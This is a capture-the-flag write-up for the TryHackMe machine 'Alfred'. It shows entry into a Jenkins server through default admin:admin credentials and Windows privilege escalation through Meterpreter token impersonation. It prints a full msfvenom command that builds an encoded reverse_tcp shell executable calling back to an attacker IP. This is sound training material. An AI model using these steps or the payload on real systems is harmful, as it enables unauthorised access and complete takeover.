---
layout: post
title: THM Alfred
---

This is a write-up for the machine [Alfred](https://tryhackme.com/room/alfred) from [tryhackme](https://tryhackme.com).

<!-- MarkdownTOC -->

- [Initial Access](#initial-access)
- [Switching Shells](#switching-shells)
- [Privilege Escalation](#privilege-escalation)

<!-- /MarkdownTOC -->

## Initial Access

We run the usual nmap scanner and find:

- Port 80 http.
- Port 8080 http.
- Port 3389 rdp.

If we connect to the server in port 80 we can see

![Wayne](../images/alfred/alf1.png)

Nothing seems too interesting and a `gobuster` scan doesn't find anything useful.

In port 8080 we have a `jenkins` server.

![jenikins](../images/alfred/alf2.png)

We try to log in with the credentials `admin:admin` and got access to the `jenkins` control panel. From here we can move to configure tab, under project options and we find a field to write commands. Using it with this payload we gain a shell on the system.

![build](../images/alfred/alf3.png)

![shell](../images/alfred/alf4.png)

From here we can grab the user flag.

## Switching Shells

Once we are on the system we are going to switch to a `meterpreter` shell to make the privilege escalation easier.

This is the process we follow, we create a reverse shell executable with `msfvenom`, with the command

```
msfvenom -p windows/meterpreter/reverse_tcp -a x86 --encoder x86/shikata_ga_nai LHOST=10.11.23.211 LPORT=444 -f exe -o metshell.exe
```

Set the handler in metasploit. Use `exploit/multi/handler` and configure the options

![set handler](../images/alfred/alf5.png)

We transfer the shell executable created with `msfvenom` to the windows machine and execute it gaining a `meterpreter` shell.

## Privilege Escalation

The technique we are going to use to elevate privileges in the machine is called token impersonation.

First we check the privileges we have in this account using the command `whoami/priv`

![priv](../images/alfred/alf6.png)

The `SeDebugPrivileged` and `SeImpersonatePrivileges` are enabled. We use the `incognito` module to exploit the vulnerability. We use the command `use incognito` to load the module and we check the available tokens with `list_tokens -g`

![tokens](../images/alfred/alf7.png)

The `BUILTIN\Administrator` token is available, to impersonate it we run

![impersonate](../images/alfred/alf8.png)

We have a elevated privileges but, by the way `windows` handles the permissions, using the primary tokens of the process to determine what they can do or cannot do, we need to migrate to a process with the right permissions. The safest process to pick is the `services.exe`. We list the processes and migrate to the one mentioned.

![migrate](../images/alfred/alf9.png)

Now we have complete access and can read the root flag.